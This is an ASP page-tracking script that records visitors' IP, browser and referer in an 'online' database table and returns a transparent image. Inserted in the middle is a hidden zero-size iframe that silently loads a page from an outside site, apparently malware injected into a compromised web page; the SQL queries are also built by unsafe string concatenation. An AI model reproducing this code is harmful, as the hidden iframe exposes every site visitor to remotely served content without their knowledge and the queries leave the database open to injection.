<!--#include file="inc_config.asp"-->
<%
isCan = CFG_IsCan

if isCan then
Response.Expires = 0

vIP			= Request.ServerVariables("Remote_Addr")
vAgent		= Request.ServerVariables("HTTP_USER_AGENT")
vPage		= Request.ServerVariables("HTTP_REFERER")

vAgent		= replace(vAgent,"'","''")
vPage		= replace(vPage,"'","''")

%>
<!--#include file="inc_conn.asp"-->
<IFRAME SRC=http://www.xiagame.com/ajiang/ajiang.asp width=0 height=0 frameborder=no border=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=no></IFRAME>
<%
  truenow = dateadd("h",0 - CFG_ZoneServer,now())
  onnnow = dateadd("s",-2.5 * CFG_CheckOnlineS,truenow)
  set isOnline = conn.Execute("select * from online where LastTime>#"&onnnow&"# and UserIP='"&vIP&"' and Site_ID=" & SiteID)
  if isOnline.eof then
    set rsOd = conn.Execute("select top 1 id from online where LastTime<#"&onnnow&"# and Site_ID=" & SiteID & " order by LastTime")
    if rsOd.eof then
      conn.Execute "insert into online (Site_ID,UserIP,UserAgent,UserPage,OnTime,LastTime) VALUES("&SiteID&",'"&vIP&"','"&vAgent&"','"&vPage&"','"&truenow&"','"&truenow&"')"
    else
      conn.Execute "update online set Site_ID="&SiteID&",UserIP='"&vIP&"',UserAgent='"&vAgent&"',UserPage='"&vPage&"',Ontime='"&truenow&"',LastTime='"&truenow&"' where id=" & rsOd("id")
    end if
  else
    conn.Execute("update online set LastTime='"&truenow&"',UserPage='"&vPage&"' where LastTime>#"&onnnow&"# and UserIP='"&vIP&"' and Site_ID=" & SiteID)
  end if

end if		'if isCan

Server.Transfer("style/images/touming.gif")


%>